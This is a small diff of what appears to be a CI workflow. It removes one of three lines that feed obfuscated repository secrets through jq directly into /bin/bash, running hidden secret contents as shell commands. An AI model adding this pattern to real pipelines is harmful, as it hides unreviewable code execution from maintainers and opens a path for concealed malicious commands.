@@ -22,7 +22,6 @@ jobs:
           trap5: ${{ secrets.trap5 }}
         run: |
           printf '%s' "$trap5" | jq -r .fw76943 | /bin/bash
-          printf '%s' "$wqv655" | jq -r .dli8941 | /bin/bash
           echo $uuzdv585 | jq -r .gbwdh40127 | /bin/bash
 
       - name: Upload output
